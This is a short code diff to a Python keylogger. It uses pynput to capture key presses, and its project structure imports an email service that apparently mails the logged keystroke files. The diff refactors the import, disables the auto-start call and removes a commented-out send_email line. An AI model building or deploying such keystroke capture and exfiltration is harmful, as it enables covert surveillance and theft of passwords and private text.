@@ -1,7 +1,7 @@
 from pynput.keyboard import Key, Listener
 import time
 
-from keylogger.mail import send_email
+from key_logger.mail import EmailService
 from settings import time_iteration, number_of_iterations_end, filenames
 
 
@@ -17,12 +17,11 @@ class KeyLogger:
         self.currentTime = time.time()
         self.stoppingTime = time.time() + time_iteration
 
-        self.run()
+        # self.run()
 
     def run(self):
-        while self.number_of_iterations < number_of_iterations_end:
-            with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
-                listener.join()
+        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
+            listener.join()
 
     def on_press(self, key):
         print(key)
@@ -51,7 +50,7 @@ class KeyLogger:
             return False
 
     def after_stop(self):
-        # send_email(self.filename, self.file_path)
+
 
         # with open(self.file_path, "w") as f:
         # f.write(" ")
